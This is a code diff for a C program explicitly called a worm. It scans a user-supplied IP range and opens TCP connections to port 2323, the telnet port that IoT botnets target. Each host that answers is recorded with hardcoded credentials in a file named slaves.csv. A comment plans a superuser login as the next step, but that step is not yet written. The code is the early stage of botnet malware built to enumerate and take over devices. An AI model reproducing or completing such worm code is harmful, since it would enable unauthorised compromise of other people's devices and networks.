@@ -12,6 +12,11 @@ static uint32_t start_ip;
 static uint32_t end_ip;
 static char* ID;
 static char* PW;
+static bool fileNameGiven=false;
+const char* file="./slaves.csv";
+
+
+
 
 
 //Purpose : when wrong input argument is given.
@@ -88,6 +93,9 @@ bool isValidInput(int argc, char *argv[]){
 	if(argc!=3 && argc!=4){
 		showUsage(argv[0]);
 	}
+	if(argc==4){
+		fileNameGiven=true;
+	}
 
 	//check out IP Address
 
@@ -121,16 +129,41 @@ bool isValidInput(int argc, char *argv[]){
 //ip given in Big ENDIAN
 bool worm(uint32_t ip){
 	//test purpose worm
+	/*
 	if(ip%2==0){
-		ID=strdup("blaze");
-		PW=strdup("frost");			
-		return true;
+
 	}
 	else{
 		return false;
 	}
+	*/
 
 //Connect to Specific IP with port number 2323
+	int sockfd;
+	struct sockaddr_in servaddr;
+
+	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
+	{
+		return false;
+	}
+
+	memset(&servaddr,0,sizeof(struct sockaddr_in));
+	servaddr.sin_family=AF_INET;
+	servaddr.sin_port=htons(2323);
+	servaddr.sin_addr.s_addr=ip;
+
+	if(connect(sockfd,&servaddr,sizeof(servaddr))<0)
+	{
+		return false;
+	}
+
+	ID=strdup("blaze");
+	PW=strdup("frost");
+
+	//Close
+	close(sockfd);	
+	return true;
+
 
 //If connected try to login with superuser
 
@@ -148,14 +181,22 @@ bool worm(uint32_t ip){
 
 //iterate Worm function in IP range given by User
 //IP RANGE variable :  Little Endian form
-void iterateWorm(uint32_t start_ip,uint32_t end_ip){
+void iterateWorm(uint32_t start_ip,uint32_t end_ip,char* fileName){
 	uint32_t i;
 	uint32_t bigEndian;
 	char* ptr;
 	struct sockaddr_in sa;
 	bool success=false;
-	const char* file="./slaves.csv";
-	FILE *fp=fopen(file,"w");
+	FILE *fp;
+	if(fileNameGiven)
+	{
+		fp=fopen(fileName,"w");
+	}
+	else
+	{
+		fp=fopen(file,"w");		
+	}
+
 
 
 	//htonl -> worm
@@ -188,6 +229,13 @@ int main(int argc, char *argv[])
 	validInput=isValidInput(argc,argv);
 	if(!validInput)
 		showUsage(argv[0]);
-	iterateWorm(start_ip,end_ip);
+
+	if(argc==4){
+		iterateWorm(start_ip,end_ip,argv[3]);
+	}
+	else{
+		iterateWorm(start_ip,end_ip,"");	
+	}
+	
 	return 0;
 }
